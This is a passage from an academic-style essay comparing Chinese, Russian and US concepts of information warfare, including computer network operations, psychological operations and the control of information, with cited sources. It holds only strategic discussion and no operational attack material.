various cultures and capabilities to include EW , CNO and tradition
PSYOPS, MILDEC , OPSEC . Where Chinese are attempting to mobilize its
population in accordance with the concept of people’s war in
capabilities in development in CNA, especially CNR , CND, which bring
worries of the danger of globalization (Pufeng, Spring 1995), (Anderson,
The first edition 2001), (Bowdish, December1998 – February 1999).  &lt;/p&gt;
&lt;p&gt;Nerveless, the IW for Soviet Union and subsequently to Russia its means
ranging from controlling own society to demoralizing the enemy,
gathering intelligence and attacking the enemy through CNO. There taking
step further, where we had dealing with enemy with technology in US and
thinking in China, Russia is trying to manipulate the biological parts
of the enemy dealing with information (Liaropoulos, 2007).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As a result, the information age is creating or will create new means of
influence and new ends to influence. This process will create new means
of victory, new troops and added complexity. It is important, that these
new things will add new possibilities between war and peace and it will
increase possibilities to act before war and to avoid conventional
warfare (Ahvenainen, January 2000).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, to achieve victory in information warfare, the central issue is
the control of information. Such as, Chinese approaches to use old
tactics and strategies to win victory in information warfare and Russia
is educating talented people and facilities to produce high quality
cyber warriors for state, private business and crime.&lt;/p&gt;
